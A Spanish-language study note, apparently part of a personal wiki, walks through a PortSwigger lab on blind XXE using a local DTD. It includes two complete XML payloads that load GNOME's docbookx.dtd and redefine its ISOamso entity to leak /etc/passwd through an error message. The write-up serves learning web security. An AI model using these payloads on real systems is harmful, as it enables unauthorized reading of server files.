---
aliases:
  - XXE 008 - reutilizar DTD local
  - blind xxe local dtd
  - repurpose local dtd docbookx
tags:
  - vuln/xxe
  - example
  - portswigger
---

# 008 — XXE ciego: reutilizar un DTD local (sin salida a internet)

> Lab: [Exploiting XXE to retrieve data by repurposing a local DTD](https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd) · **Expert** · técnica → [[vulnerabilities/006-xxe/xxe|entry point]]

## ¿Por qué acá? (el último recurso)
- **Vengo de [[vulnerabilities/006-xxe/examples/006-xxe-ciego-exfiltrar-con-dtd-externo|006]] y [[vulnerabilities/006-xxe/examples/007-xxe-ciego-error-based-con-dtd-externo|007]]:** ambos necesitan **cargar un DTD externo** (exploit server) o un **canal OOB**.
- **Por qué no me alcanza:** el server **no sale a internet** — no puedo cargar un DTD externo, no hay OOB, **y** las entidades encadenadas no se pueden declarar internamente (lo mismo que forzó a 006 a salir afuera). Nada de lo anterior funciona.
- **Entonces:** reutilizo un **DTD que ya está en el disco** del server y **redefino una entidad suya** para inyectar el error-based — **todo local, sin internet**.

## Cómo explotarlo

### 1. Encontrar un DTD local (paso previo)
Confirmás que existe un DTD conocido cargándolo solo. El estándar es el de GNOME **`yelp`**:
```http
POST /product/stock HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
Si **no** da error de "archivo no encontrado" → existe → seguí.

### 2. El ataque — redefinir una entidad del DTD local
En `docbookx.dtd` existe la entidad de parámetro `ISOamso`. La **redefinís**:
```http
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

## Verificación
La respuesta trae el `FileNotFoundException` con `/etc/passwd` embebido (como [[vulnerabilities/006-xxe/examples/007-xxe-ciego-error-based-con-dtd-externo|007]], pero **sin server externo**).

## Detalles que se pasan por alto
- **`ISOamso` debe existir DENTRO de `docbookx.dtd`.** Al cargar el DTD local, tu redefinición gana y dispara el ataque. Con otro DTD local → redefinís una entidad **suya**.
- **Escapado doble:** dentro de un valor de entidad que declara entidades, `%` = `&#x25;` y `&` = `&#x26;`. Por eso aparece `&#x26;#x25;` (un `%` doblemente escapado) y `&#x27;` (comilla simple).
- **No usa exploit server ni Collaborator** — esa es la gracia: funciona con el server **aislado de internet**. Es el más rebuscado porque **nada de 001–007 aplicaba**.
- `docbookx.dtd` es el candidato estándar (viene con `yelp`); hay otras rutas de DTD locales.
